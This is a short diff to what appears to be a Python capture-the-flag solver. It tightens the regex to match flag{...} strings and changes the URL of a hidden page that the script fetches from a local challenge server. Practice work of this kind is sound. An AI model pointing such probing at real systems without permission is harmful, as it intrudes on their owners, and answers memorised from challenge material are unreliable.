@@ -25,7 +25,7 @@ def get_message_flag(
 
 def exploit():
     url = "http://localhost:3000"
-    re_pattern = r'\b[a-zA-Z_]*_[a-zA-Z_]*_[a-zA-Z_]*_[a-zA-Z_]*\b'
+    re_pattern = r'flag\{[a-zA-Z_]+\}'
 
     print("flag1:")
     get_message_flag(
@@ -38,7 +38,7 @@ def exploit():
         regex_pattern=re_pattern
     )
     print("\nflag2:")
-    page2 = requests.get(url+ '/secret_page_that_definitely_doesnt_have_a_flag_hide_inside')
+    page2 = requests.get(url+ '/secret_page_that_definitely_doesnt_have_a_flag_hide_inside.html')
     content2 = page2.text
     print(re.findall(re_pattern, content2))
 
